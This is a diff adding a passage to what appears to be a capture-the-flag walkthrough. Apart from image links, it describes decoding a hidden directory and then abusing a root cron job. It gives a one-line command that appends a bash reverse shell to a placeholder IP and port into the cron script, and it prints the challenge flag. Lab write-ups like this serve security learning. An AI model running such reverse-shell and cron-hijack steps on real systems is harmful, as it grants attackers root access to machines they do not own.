@@ -32,4 +32,23 @@
 
 ![image](https://user-images.githubusercontent.com/60177793/93798941-10f67700-fc5c-11ea-99f9-81d884971907.png)
 
+###### The decode looked very much like a directory and this worked, taking me to page:
+
+![image](https://user-images.githubusercontent.com/60177793/93799119-531fb880-fc5c-11ea-8f63-140795719f06.png)
+![image](https://user-images.githubusercontent.com/60177793/93799353-abef5100-fc5c-11ea-95d3-b49348209982.png)
+
+![image](https://user-images.githubusercontent.com/60177793/93799271-8f531900-fc5c-11ea-802b-f52d25254895.png)
+![image](https://user-images.githubusercontent.com/60177793/93799204-764a6800-fc5c-11ea-916a-29a44a9092a8.png)
+![image](https://user-images.githubusercontent.com/60177793/93799672-17d1b980-fc5d-11ea-9605-19df12f5a563.png)
+![image](https://user-images.githubusercontent.com/60177793/93799933-7ac35080-fc5d-11ea-8041-45cd4780a0fb.png)
+
+![image](https://user-images.githubusercontent.com/60177793/93799893-6b440780-fc5d-11ea-8060-43deed732cfb.png)
+###### There is an interesting cron job being run .mysecretcronjob.sh every minute. We can see that it is being run by root.
+##### ets append a shell to this file
+##### echo ‘bash -i >& /dev/tcp/IP/PORT 0>&1’ >> /var/www/.mysecretcronjob.sh
+##### flag :  flag{63a9f0ea7bb98050796b649e85481845}
+![image](https://user-images.githubusercontent.com/60177793/93800560-63389780-fc5e-11ea-9b39-123892d5f05e.png)
+
+
+
 
